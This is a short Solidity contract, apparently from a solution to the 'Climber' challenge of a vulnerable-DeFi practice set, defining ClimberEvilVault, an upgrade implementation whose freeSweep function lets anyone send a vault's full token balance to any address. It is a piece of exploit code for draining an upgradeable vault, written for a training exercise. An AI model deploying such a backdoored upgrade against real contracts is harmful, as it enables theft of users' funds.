// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "contracts/climber/ClimberVault.sol";

contract ClimberEvilVault is ClimberVault {

    function freeSweep(IERC20 token, address receiver) external {
        require(token.transfer(receiver, token.balanceOf(address(this))), "Transfer failed");
    }
}